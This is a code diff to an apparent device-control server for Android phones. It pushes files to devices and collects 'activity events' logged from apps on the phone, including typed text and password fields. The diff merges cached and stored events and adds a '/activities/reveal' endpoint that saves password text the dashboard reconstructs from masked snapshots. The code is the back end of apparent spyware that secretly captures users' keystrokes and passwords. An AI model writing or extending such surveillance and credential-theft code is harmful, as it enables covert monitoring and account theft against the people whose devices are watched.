@@ -240,12 +240,12 @@ router.post('/upload/:deviceId', upload.single('file'), async (req, res) => {
         const fileBuffer = await fs.readFile(req.file.path);
         const base64Data = fileBuffer.toString('base64');
 
-        // Send to device
+        // Send to device — large base64 payloads need more than the 30s default on slow uplinks
         const result = await commandDispatcher.sendCommand(deviceId, 'file_upload', {
             path: targetPath || `/storage/emulated/0/Download/${req.file.originalname}`,
             data: base64Data,
             filename: req.file.originalname,
-        });
+        }, 120000);
 
         // Clean up temporary file
         await fs.unlink(req.file.path);
@@ -322,6 +322,13 @@ const handleTempUpload = async (req, res) => {
         if (!error && url) {
             // Supabase success — clean up local temp
             await fs.unlink(req.file.path).catch(e => {});
+            // Schedule cloud cleanup (10 min window, matching the local fallback).
+            // Without this, large-file previews via /api/download-temp would leave a
+            // permanent public copy in the media-extracts bucket.
+            setTimeout(() => {
+                deleteFileFromSupabase('media-extracts', req.file.filename)
+                    .catch(e => console.error('Delayed temp cleanup failed:', e.message));
+            }, 10 * 60 * 1000);
             return res.json({
                 status: 'success',
                 storage: 'cloud',
@@ -512,7 +519,7 @@ router.get('/stats', (req, res) => {
 
 /**
  * GET /api/device/:deviceId/history - Get command history for device
- * Query params: ?limit=50&action=call_state&status=success
+ * Query params: ?limit=50&action=activity_status&status=success
  */
 router.get('/device/:deviceId/history', (req, res) => {
     const { deviceId } = req.params;
@@ -604,41 +611,103 @@ router.get('/device/:deviceId/activities', async (req, res) => {
     const limit = parseInt(req.query.limit) || 500;
     const appFilter = req.query.app || null;
 
-    // Check in-memory cache first
+    // Merge the in-memory cache (not-yet-persisted tail) with the DB history so
+    // a streaming burst never produces a partial view. DB rows are authoritative.
     const cache = global.activityCache;
-    let events = [];
-
+    let cachedEvents = [];
     if (cache && cache.has(deviceId)) {
-        events = cache.get(deviceId).slice(0, limit);
+        cachedEvents = cache.get(deviceId).slice(0, limit);
     }
 
-    // If no cache, try DB
-    if (events.length === 0) {
-        const dbEvents = await getActivityEventsFromDB(deviceId, limit);
-        if (dbEvents.length > 0) {
-            events = dbEvents.map(row => ({
-                type: row.event_type,
-                app: row.app_package,
-                text: row.text,
-                fullText: row.full_text,
-                className: row.class_name,
-                timestamp: new Date(row.created_at).getTime(),
-                receivedAt: row.created_at,
-            }));
-        }
+    let dbEvents = [];
+    try {
+        dbEvents = await getActivityEventsFromDB(deviceId, limit);
+    } catch (err) {
+        console.error(`[Admin] Error loading activity events from DB for ${deviceId}:`, err.message);
     }
 
-    // Apply app filter
-    if (appFilter && events.length > 0) {
-        events = events.filter(e => e.app && e.app.includes(appFilter));
-    }
+    const events = dbEvents.map(row => ({
+        uuid: row.event_uuid,
+        type: row.event_type,
+        app: row.app_package,
+        text: row.text,
+        realText: row.real_text,
+        isPassword: row.is_password,
+        textRevealed: row.text_revealed,
+        revealPartial: row.reveal_partial,
+        fullText: row.full_text,
+        className: row.class_name,
+        beforeText: row.before_text,
+        contentDesc: row.content_desc,
+        scrollY: row.scroll_y,
+        maxScrollY: row.max_scroll_y,
+        itemCount: row.item_count,
+        previousApp: row.previous_app,
+        timestamp: new Date(row.created_at).getTime(),
+        receivedAt: row.created_at,
+    }));
+
+    // Add cache events that are not already present in the DB (uuid dedup)
+    const seen = new Set(events.map(e => e.uuid).filter(Boolean));
+    cachedEvents.forEach(ce => {
+        if (ce.uuid && seen.has(ce.uuid)) return;
+        events.push(ce);
+    });
+
+    events.sort((a, b) => Number(b.timestamp || 0) - Number(a.timestamp || 0));
+    const sliced = events.slice(0, limit);
+
+    const filtered = appFilter ? sliced.filter(e => e.app && e.app.includes(appFilter)) : sliced;
 
     res.json({
         success: true,
-        count: events.length,
-        source: events.length > 0 ? 'cache' : 'none',
-        events,
+        count: filtered.length,
+        source: dbEvents.length > 0 ? 'db' : (cachedEvents.length > 0 ? 'cache' : 'none'),
+        events: filtered,
     });
+});
+
+/**
+ * POST /api/device/:deviceId/activities/reveal - Persist reconstructed
+ * password text computed by the dashboard. The phone only sends masked
+ * snapshots; the dashboard reconstructs the real text and writes it here so it
+ * survives page reloads (best-effort; recompute is always possible).
+ */
+router.post('/device/:deviceId/activities/reveal', async (req, res) => {
+    const { deviceId } = req.params;
+    const updates = Array.isArray(req.body?.updates) ? req.body.updates : [];
+    if (updates.length === 0) {
+        return res.json({ success: true, updated: 0 });
+    }
+
+    // Validate + cap; never trust arbitrary payloads.
+    const clean = updates
+        .slice(0, 500)
+        .filter(u => u && u.uuid && typeof u.text === 'string' && u.text.length > 0 && u.text.length <= 2000)
+        .map(u => ({ uuid: String(u.uuid), text: u.text, partial: !!u.partial }));
+
+    let updated = 0;
+    try {
+        const { updateActivityReveal } = await import('../services/database.js');
+        updated = await updateActivityReveal(deviceId, clean);
+    } catch (err) {
+        console.error(`[Admin] Error persisting reveals for ${deviceId}:`, err.message);
+        return res.status(500).json({ success: false, error: 'Failed to persist reveals' });
+    }
+
+    // Reflect into the in-memory cache so live views stay consistent.
+    if (global.activityCache && global.activityCache.has(deviceId)) {
+        const cached = global.activityCache.get(deviceId);
+        clean.forEach(u => {
+            const ev = cached.find(e => e.uuid === u.uuid);
+            if (ev) {
+                ev.textRevealed = u.text;
+                ev.revealPartial = u.partial;
+            }
+        });
+    }
+
+    res.json({ success: true, updated });
 });
 
 /**
